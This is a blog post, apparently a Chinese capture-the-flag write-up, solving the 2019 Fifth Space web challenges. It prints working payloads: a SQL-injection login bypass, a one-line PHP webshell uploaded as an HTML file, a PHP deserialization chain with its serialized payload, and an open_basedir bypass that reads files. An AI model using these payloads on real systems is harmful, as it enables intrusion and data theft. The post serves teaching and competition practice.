<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lethe">


    <meta name="subtitle" content="Life is a struggle">


    <meta name="description" content="Lethe's Blog">


    <meta name="keywords" content="Lethe's Blog">


<title>第五空间Writeup_Web | Lethe&#39;s Blog</title>



    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.1.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">第五空间Writeup_Web</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">September 1, 2019&nbsp;&nbsp;16:33:24</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Writeup/">Writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="空相"><a href="#空相" class="headerlink" title="空相"></a>空相</h1><p>（1）进入页面，提示了参数id </p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903160325343.png" alt="在这里插入图片描述"></p>
<p>（2）尝试一下：?id&#x3D;1‘<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903160348218.png" alt="在这里插入图片描述"></p>
<p>（3）访问该文件，并加上队伍的token作为参数即可，<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/2019090316072259.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="五叶"><a href="#五叶" class="headerlink" title="五叶"></a>五叶</h1><p>（1）进入后，是一个登陆界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903160801767.png" alt="在这里插入图片描述"><br>（2）这一题比较脑洞，实际上是用万能密码来进行登陆admin账号。</p>
<ul>
<li><p>经过测试：过滤了*、&#x3D;、and、or、from、select、union、insert、update等，单引号加括号闭合。</p>
</li>
<li><p>猜测后台sql语句可能为：<code>select * form xxx where password = (‘$password’);</code></p>
</li>
<li><p>于是构造密码为：<code>1’) || username like ‘admin’-- </code>（最后有个空格）</p>
</li>
<li><p>拼接后为： <code>….  where password =(‘1’) || username=&#39;admin&#39; -- </code></p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/2019090316091050.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="六尘（非预期）"><a href="#六尘（非预期）" class="headerlink" title="六尘（非预期）"></a>六尘（非预期）</h1><p>（1）扫目录得到&#x2F;log&#x2F;</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903160951628.png" alt="在这里插入图片描述"></p>
<p>（2）访问如下，可以直接看到access.log的内容：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903161003750.png" alt="在这里插入图片描述"></p>
<p>（3）在access.log日志中搜索关键词flag，发现存在flagishere目录，访问里面的文件，并替换token即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903161018938.png" alt="在这里插入图片描述"></p>
<p><strong>预期解</strong>：通过SSRF扫描端口 + gopher协议攻击内网的Struts2，题目环境开的时间太短了，没来得及复现..</p>
<br>

<h1 id="空性"><a href="#空性" class="headerlink" title="空性"></a>空性</h1><p>（1）进入后，是一个登陆界面，发现这里右键查看不了代码（用了一段JS代码实现的），F12或BP抓包看到如下一段JS代码，用户名和密码均为Youguess，但实际上我们直接访问那个文件即可。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/2019090316112880.png" alt="在这里插入图片描述"></p>
<p>（2）访问.&#x2F;151912db206ee052.php，页面上除了显示“听说你的Linux用的很6？”这句话以外，得不到任何有用信息，于是考虑文件泄露。</p>
<p>Linux下的vim编辑器在非正常退出的情况下会自动生成swp后缀的备份文件，由于此类格式文件无法解析，此时便可以通过浏览器直接下载此敏感文件，这导致程序的源码泄漏。</p>
<p>（3）于是访问 xxx&#x2F;.151912db206ee052.php.swp下载文件，并通过命令<code>vi –r [文件名]</code>进行恢复。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903161215948.png" alt="在这里插入图片描述"></p>
<p>（4）审计代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">First</span></span>&#123;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">firstlevel</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="variable">$a</span>=<span class="string">&#x27;whoami&#x27;</span>;  </span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);  </span><br><span class="line">        <span class="variable">$fname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>]:<span class="string">&#x27;./js/ctf.js&#x27;</span>;  </span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fname</span>));  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$content</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;;  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;听说你的Linux用的很6？&#x27;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$execfirst</span> = <span class="keyword">new</span> <span class="title class_">First</span>();  </span><br><span class="line"><span class="variable">$execfirst</span> -&gt; <span class="title function_ invoke__">firstlevel</span>();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>利用方式一：PHP伪协议——php:&#x2F;&#x2F;input，所以构造：<code>?fname=php://input</code>，并POST数据：<code>whoami</code></p>
</li>
<li><p>利用方式二：变量覆盖——extract()，注意到<code>$a==$content</code>进行的是松散比较，所以构造payload：<code>?a=&amp; fname=lethe</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903161506717.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<p>（5）上一层成功绕过后，会进入到一个上传界面，通过白名单严格的限制了上传文件的后缀，且对文件内容中的eval()、system()、 phpinfo()等许多函数进行了检测，所以想按一般的文件上传getshell是不行的。</p>
<p> fuzz+脑洞，发现可以上传html后缀的文件，但是上传html文件有什么用呢，并不能解析其中的php代码。</p>
<p>看到url中的参数有<code>file=xxxxxx</code>这个参数，很像文件包含的题目形式。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903161552691.png" alt="在这里插入图片描述"></p>
<p>测试发现<code>http://111.33.164.6:10003/3792689baaabc7eb</code>本身就是一个上传页面，猜测存在文件包含。</p>
<p>于是构造html文件的内容为：<code>&lt;?php $f = $_GET[f]; $f($_GET[s]); ?&gt;  </code>         </p>
<p>上传后，修改url中file参数的值，<code>?file=upload/xxxxxxxx</code>（上传的文件目录，去掉文件后缀），然后传入相应参数，即可getshell。</p>
<br>

<h1 id="八苦"><a href="#八苦" class="headerlink" title="八苦"></a>八苦</h1><p>这一题下午的时候坏了，一直到最后都没修复好…</p>
<p>（1）进入后发现页面上，只有一个welcome，最后扫描发现是<code>.phps</code>上有源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// flag.php in /var/html/www</span></span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$careful</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$securuty</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;careful===<span class="number">1</span>)&#123;</span><br><span class="line">				<span class="title function_ invoke__">phpinfo</span>();	<span class="comment">// step 1:	read source,get phpinfo and read it carefullt</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;securuty[<span class="variable">$name</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$param1</span>,<span class="variable">$param2</span></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$param1</span>&#125;)&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">&#x27;$a=&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;dangerous&#x27;</span>].<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;user=<span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;user-&gt;<span class="title function_ invoke__">say_hello</span>();  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>);</span><br><span class="line">	<span class="variable">$string</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>]??<span class="variable">$a</span>;</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>（2）看样子是一道反序列化的题目了，注释中提示了先仔细看phpinfo的内容，于是想办法先执行phpinfo()。</p>
<p>可以看到，这段代码里没有文件包含，也没有定义Welcome类，但是却在User类里实例化了Welcome类，所以应该是phpinfo中隐藏了信息。</p>
<p>所以，看phpinfo的脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$careful</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;careful = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>（3）然后经过一系列操作得到第二段代码，如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$willing</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$action</span> ;  <span class="comment">//action=new Test;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;action=<span class="keyword">new</span> <span class="title class_">Welcome</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;willing)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;action-&gt;<span class="title function_ invoke__">say_hello</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>整个利用过程，和QWB2019的upload那一题差不多，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Welcome_again =&gt; ___destruct</span><br><span class="line">Test =&gt; __call</span><br><span class="line">Test =&gt; __get</span><br><span class="line">eval()</span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$willing</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$action</span> ;  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;action = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;willing = <span class="number">1</span>;             <span class="comment">//过if判断</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;willing)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;action-&gt;<span class="title function_ invoke__">say_hello</span>(); <span class="comment">//调用Test::__call</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$careful</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$securuty</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;securuty = [<span class="string">&#x27;say_hello&#x27;</span> =&gt; <span class="number">1</span>];   </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;careful = <span class="number">0</span>;                </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;securuty[<span class="variable">$name</span>];        <span class="comment">//返回1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$param1</span>,<span class="variable">$param2</span></span>)</span>&#123;  <span class="comment">//param1=say_hello</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$param1</span>&#125;)&#123;                 <span class="comment">//调用Test::__get</span></span><br><span class="line">                <span class="comment">//eval(&#x27;$a=&#x27;.$_GET[&#x27;dangerous&#x27;].&#x27;;&#x27;);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Welcome_again</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到payload:<br><code>?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D</code></p>
<p>同时通过dangerous参数传入命令，注意要用<code>;</code>闭合前面的赋值语句。</p>
<p>（4）最后在读flag的时候好像还要bypass open_basedir。</p>
<p>可以参考：<a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">从PHP底层看open-basedir-bypass</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/Fifth-Space-Writeup-Web/20190903163125433.png" alt="在这里插入图片描述"></p>
<p>最终payload：</p>
<p><code>?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D&amp;dangerous=1;chdir(&#39;/tmp&#39;);mkdir(&#39;sky&#39;);chdir(&#39;sky&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/var/www/flag.php&#39;)); </code></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lethe</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://lethe.site/2019/0901/Fifth-Space-Writeup-Web/">https://lethe.site/2019/0901/Fifth-Space-Writeup-Web/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Writeup/"># Writeup</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/0906/SSRF-CRLF-Attack-by-SoapClient/">利用SoapClient类进行SSRF+CRLF攻击</a>
            
            
            <a class="next" rel="next" href="/2019/0826/SUCTF-2019-Writeup/">SUCTF_2019_部分复现</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Life is a struggle.</span>
        <!-- <span>© Lethe | 2019 - 2022</span> -->
    </div>
</footer>

    </div>
</body>

</html>